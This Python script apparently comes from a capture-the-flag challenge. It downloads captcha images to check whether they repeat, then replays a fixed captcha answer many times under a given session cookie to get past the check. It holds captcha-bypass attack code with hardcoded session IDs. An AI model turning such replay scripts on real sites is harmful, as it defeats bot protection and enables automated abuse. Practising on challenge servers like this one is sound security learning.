import requests

url = 'http://hackers.gg:6656'
img_url = 'http://hackers.gg:6656/?image'


# odds of guessing the right captcha:
# print((5**94) * 100)

def download():
    all_the_images = []

    while len(all_the_images) < 99:
        r = requests.post(img_url, cookies={'PHPSESSID': '6eb351904053e77a30980e911c227319'})
        # print(r)
        # print(r.headers)
        # print(r.content)
        if r.content not in all_the_images:
            all_the_images.append(r.content)
        else:
            print('found a match')
            print('len(all_the_images) ', len(all_the_images))

    print('len(all_the_images) ', len(all_the_images))


def test_submit_captcha(captcha='pV74S', session_id='7fc6116a2f6025109873823a0913302c'):
    print('\ntesting')

    count = 0
    while count < 200:
        # start_time = time.perf_counter()
        r = requests.get(url, cookies={'PHPSESSID': session_id})
        r_img = requests.get(img_url, cookies={'PHPSESSID': session_id})
        # mid_time = time.perf_counterf()
        r = requests.post(url, cookies={'PHPSESSID': session_id}, data={'captcha': captcha})
        # end_time = time.perf_counter()
        # print('mid time: ', end_time - mid_time)
        # print('total time: ', end_time - start_time)
        # slow_msg = b'You were too slow, you must solve the captcha in half a second or less'
        # if slow_msg != r.content[:len(slow_msg)]:
        incorrect_msg = b'Incorrect captcha'
        if incorrect_msg != r.content[:len(incorrect_msg)]:
            print(r.content)
        # else:
        #    print(r.content)
        #    print('too slow')

        count += 1


if __name__ == '__main__':
    test_submit_captcha()

    # test Zion's session: '@ROq+' <- CONFIRMED Session ID ensures timing, does not generate new images
    # import pdb; pdb.set_trace()

    test_submit_captcha(captcha='EV?#i')
